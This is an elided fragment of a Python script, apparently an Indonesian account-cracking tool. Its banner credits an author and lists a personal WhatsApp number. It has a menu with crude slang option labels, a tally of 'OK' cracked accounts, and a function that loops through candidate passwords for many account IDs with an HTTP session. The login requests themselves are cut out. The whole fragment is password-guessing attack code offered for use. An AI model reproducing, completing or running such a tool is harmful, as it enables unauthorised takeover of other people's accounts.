...
AUTHOR : {k}>> {h}[ LUTHFI XD ] {k} <<{asu}
WA AUTHOR : {k}>> {h}[ 082267229931 ] {k}<<{asu}
...
def atur_dulu():
	print(f'╭────────────────────')
	print(' 1. SEMPAK JANDA')
	print(' 2. BH GADIS')
	print(' 3. TENGTOP BENCONG')
	print(f'╰────────────────────')
	aturid = input(f'{xxx}└──C PILIH SAYANG : ')
	print(f'╭────────────────────')
	if aturid in ['1','01']:
...
def passwrd():
	...
	print(f'{xxx}')
	print(f'{hijo}+ {puti}AKUN OKE  : {hijo}%s{xxx} '%(OK))
...
def metod1(idf,pwv,awal):
	...
	sys.stdout.write(f" LUTHFIXD [{kun} {(loop)}{puti}/{hijo}{len(id)}{puti} ] [ {hijo}{(ok)}{xxx}/{kun}{(cp)}{xxx} ] \r");sys.stdout.flush()
	ses = requests.Session()
	for pw in pwv:
		try:
